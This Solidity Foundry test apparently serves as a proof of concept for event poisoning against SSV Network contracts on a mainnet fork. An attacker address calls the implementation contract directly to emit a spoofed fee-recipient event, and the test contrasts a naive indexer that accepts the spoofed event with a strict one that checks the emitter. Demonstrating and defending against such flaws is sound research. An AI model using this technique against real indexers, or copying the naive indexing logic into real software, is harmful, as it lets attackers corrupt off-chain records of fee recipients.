pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface ISSVNetworkLike {
    function setFeeRecipientAddress(address recipient) external;
}

contract SSV_EventPoisoningTest is Test {
    address constant PROXY = 0xDD9BC35aE942eF0cFa76930954a156B3fF30a4E1;
    address constant IMPL  = 0x3B5C883cd76fbE9C9916407982075848454202b0;
    ISSVNetworkLike constant proxy = ISSVNetworkLike(PROXY);
    ISSVNetworkLike constant impl  = ISSVNetworkLike(IMPL);
    bytes32 constant FEE_EVENT_SIG =
        0x259235c230d57def1521657e7c7951d3b385e76193378bc87ef6b56bc2ec3548;
    function setUp() public {
        string memory rpc = vm.envString("ETH_RPC_URL");
        vm.createSelectFork(rpc);
    }

    function test_event_poisoning_via_implementation() public {
        address attacker = address(0xBEEF);
        deal(attacker, 1 ether);
        vm.startPrank(attacker);
        vm.recordLogs();
        proxy.setFeeRecipientAddress(address(0x1111));
        Vm.Log[] memory logsProxy = vm.getRecordedLogs();
        (address owner1, address recip1, address emitter1) = _pickFeeRecipientEvent(logsProxy);
        assertEq(owner1, attacker, "owner mismatch (proxy)");
        assertEq(recip1, address(0x1111), "recipient mismatch (proxy)");
        assertEq(emitter1, PROXY, "canonical event must be emitted by proxy");
        // exploit: emit same event directly from the IMPLEMENTATION (shouldn't be possible)
        vm.recordLogs();
        impl.setFeeRecipientAddress(address(0xDEAD));
        Vm.Log[] memory logsImpl = vm.getRecordedLogs();
        (address owner2, address recip2, address emitter2) = _pickFeeRecipientEvent(logsImpl);
        assertEq(owner2, attacker, "owner mismatch (impl)");
        assertEq(recip2, address(0xDEAD), "recipient mismatch (impl)");
        assertEq(emitter2, IMPL, "spoofed event is emitted by IMPLEMENTATION");
        address naiveFinal = _naiveIndexOwnerRecipient(logsProxy, logsImpl, attacker);
        assertEq(naiveFinal, address(0xDEAD), "naive indexer poisoned by impl-originated event");
        address strictFinal = _strictIndexOwnerRecipient(logsProxy, logsImpl, attacker);
        assertEq(strictFinal, address(0x1111), "strict indexer resists poisoning");
        vm.stopPrank();
    }

    function _pickFeeRecipientEvent(
        Vm.Log[] memory logs
    ) internal pure returns (address owner, address recipient, address emitter) {
        for (uint256 i; i < logs.length; i++) {
            Vm.Log memory lg = logs[i];
            if (lg.topics.length > 0 && lg.topics[0] == FEE_EVENT_SIG) {
                owner = address(uint160(uint256(lg.topics[1]))); // indexed owner
                recipient = abi.decode(lg.data, (address));      // non-indexed recipient
                emitter = lg.emitter;                            // contract that emitted the log
                return (owner, recipient, emitter);
            }
        }
        revert("FeeRecipientAddressUpdated not found");
    }

    // BAD: ignores which contract emitted the log (accepts implementation-originated logs)
    function _naiveIndexOwnerRecipient(
        Vm.Log[] memory logsA,
        Vm.Log[] memory logsB,
        address owner
    ) internal pure returns (address finalRecipient) {
        for (uint256 i; i < logsA.length; i++) {
            if (logsA[i].topics.length > 0 && logsA[i].topics[0] == FEE_EVENT_SIG) {
                if (address(uint160(uint256(logsA[i].topics[1]))) == owner) {
                    finalRecipient = abi.decode(logsA[i].data, (address));
                }
            }
        }
        for (uint256 i; i < logsB.length; i++) {
            if (logsB[i].topics.length > 0 && logsB[i].topics[0] == FEE_EVENT_SIG) {
                if (address(uint160(uint256(logsB[i].topics[1]))) == owner) {
                    finalRecipient = abi.decode(logsB[i].data, (address));
                }
            }
        }
    }

    // GOOD: only accepts events emitted by the canonical proxy address
    function _strictIndexOwnerRecipient(
        Vm.Log[] memory logsA,
        Vm.Log[] memory logsB,
        address owner
    ) internal pure returns (address finalRecipient) {
        address proxyAddr = PROXY;
        for (uint256 i; i < logsA.length; i++) {
            Vm.Log memory lg = logsA[i];
            if (lg.topics.length > 0 && lg.topics[0] == FEE_EVENT_SIG && lg.emitter == proxyAddr) {
                if (address(uint160(uint256(lg.topics[1]))) == owner) {
                    finalRecipient = abi.decode(lg.data, (address));
                }
            }
        }
        for (uint256 i; i < logsB.length; i++) {
            Vm.Log memory lg = logsB[i];
            if (lg.topics.length > 0 && lg.topics[0] == FEE_EVENT_SIG && lg.emitter == proxyAddr) {
                if (address(uint160(uint256(lg.topics[1]))) == owner) {
                    finalRecipient = abi.decode(lg.data, (address));
                }
            }
        }
    }
}
